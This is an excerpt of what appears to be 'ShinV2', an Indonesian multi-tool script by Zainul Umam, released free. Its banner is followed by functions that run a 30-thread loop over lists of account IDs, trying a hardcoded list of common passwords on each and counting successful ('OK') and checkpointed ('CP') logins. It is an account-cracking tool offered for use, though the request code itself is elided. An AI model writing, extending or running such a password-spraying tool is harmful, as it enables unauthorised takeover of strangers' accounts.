...
\33[1;33m    _____ __  _______   _________  __ 
\33[1;33m   / ___// / / /  _/ | / /__  /\ \/ / 
\33[1;33m   \__ \/ /_/ // //  |/ /  / /  \  / [®]PEMBUAT = ZAINUL
\33[1;33m  ___/ / __  // // /|  /  / /__ / /  [®]UPDATE  = V2.0
\33[1;33m /____/_/ /_/___/_/ |_/  /____//_/   [®]LISENSI = GRATIS
\33[1;33m      suport by:HikmaChan ____  _    __              __
\33[1;33m         ____ ___  __  __/ / /_(_)  / /_____  ____  / /____
\33[1;33m        / __ `__ \/ / / / / __/ /  / __/ __ \/ __ \/ / ___/
\33[1;33m       / / / / / / /_/ / / /_/ /  / /_/ /_/ / /_/ / (__  )
\33[1;33m      /_/ /_/ /_/\__,_/_/\__/_/   \__/\____/\____/_/____/ 
\33[1;33m█▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀█
\33[1;33m█  \33[mAuthor: Zainul Umam
...
def passwrd():
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['sayangku','sayang123','kontol','kontol123','sayang','katasandi','cintaku']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack2(idf,pwv):
	...
	pers = loop*100/len(id2)
	fff = '%'
	print('\r%s [ShinV2] %s/%s ~_~ [OK*%s | CP*%s ~_~ %s%s%s'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x), end=' ');sys.stdout.flush()
